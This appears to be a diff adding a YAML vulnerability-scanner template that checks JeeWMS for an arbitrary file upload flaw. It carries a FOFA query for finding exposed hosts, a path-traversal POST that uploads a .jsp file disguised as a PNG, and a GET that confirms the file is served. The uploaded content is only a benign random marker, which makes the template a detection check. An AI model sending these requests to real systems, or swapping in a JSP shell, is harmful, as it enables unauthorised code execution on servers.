@@ -1,0 +1,32 @@
+id: poc-yaml-jeewms-iconcontroller-do-anyfile-upload
+info:
+  name: JeeWMS iconController.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: jeewms
+  fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /rest/../iconController.do?saveOrUpdateIcon
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+  data: '------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+
+    Content-Disposition: form-data; name="name"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"Icon
+    add success")
+- method: GET
+  path: /plug-in/accordion/images/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
